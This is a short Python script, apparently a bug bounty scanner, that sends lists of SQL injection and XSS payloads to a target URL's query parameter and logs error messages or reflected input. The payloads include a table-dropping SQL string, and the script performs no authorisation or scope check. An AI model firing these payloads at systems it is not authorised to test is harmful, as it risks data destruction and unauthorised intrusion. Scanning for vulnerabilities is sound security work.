import requests
import threading
import argparse
import logging
from urllib.parse import urljoin, urlparse

# Setup logging
logging.basicConfig(filename='scan_report.log', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s')

# Enhanced list of test payloads
sql_injection_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
    "' OR '1'='1' --",
    '" OR "1"="1" --',
    "' OR 1=1--"
]
xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'\"><script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>"
]

# Function to test for SQL Injection
def test_sql_injection(url, payload):
    try:
        response = requests.get(url, params={'q': payload}, timeout=10)
        if "sql syntax" in response.text.lower() or "you have an error in your sql syntax" in response.text.lower():
            logging.info(f"Possible SQL Injection vulnerability found with payload: {payload}")
            print(f"Possible SQL Injection vulnerability found with payload: {payload}")
        else:
            logging.info(f"No SQL Injection vulnerability found with payload: {payload}")
    except requests.RequestException as e:
        logging.error(f"Error testing SQL Injection with payload {payload}: {e}")

# Function to test for XSS
def test_xss(url, payload):
    try:
        response = requests.get(url, params={'q': payload}, timeout=10)
        if payload in response.text:
            logging.info(f"Possible XSS vulnerability found with payload: {payload}")
            print(f"Possible XSS vulnerability found with payload: {payload}")
        else:
            logging.info(f"No XSS vulnerability found with payload: {payload}")
    except requests.RequestException as e:
        logging.error(f"Error testing XSS with payload {payload}: {e}")

# Function to parse command-line arguments
def parse_args():
    parser = argparse.ArgumentParser(description='Automated Bug Bounty Scanner')
    parser.add_argument('url', type=str, help='Target URL to scan')
    return parser.parse_args()

# Function to validate URL
def validate_url(url):
    parsed = urlparse(url)
    return parsed.scheme in ("http", "https") and bool(parsed.netloc)

# Main function to run tests
def main():
    args = parse_args()
    target_url = args.url

    if not validate_url(target_url):
        print("Invalid URL. Please provide a valid URL starting with http:// or https://")
        return

    print("Starting scan...")
    logging.info(f"Starting scan on {target_url}")

    threads = []

    print("Testing for SQL Injection...")
    for payload in sql_injection_payloads:
        thread = threading.Thread(target=test_sql_injection, args=(target_url, payload))
        threads.append(thread)
        thread.start()

    print("Testing for XSS...")
    for payload in xss_payloads:
        thread = threading.Thread(target=test_xss, args=(target_url, payload))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("Scan completed. Check scan_report.log for details.")
    logging.info("Scan completed.")

if __name__ == "__main__":
    main()
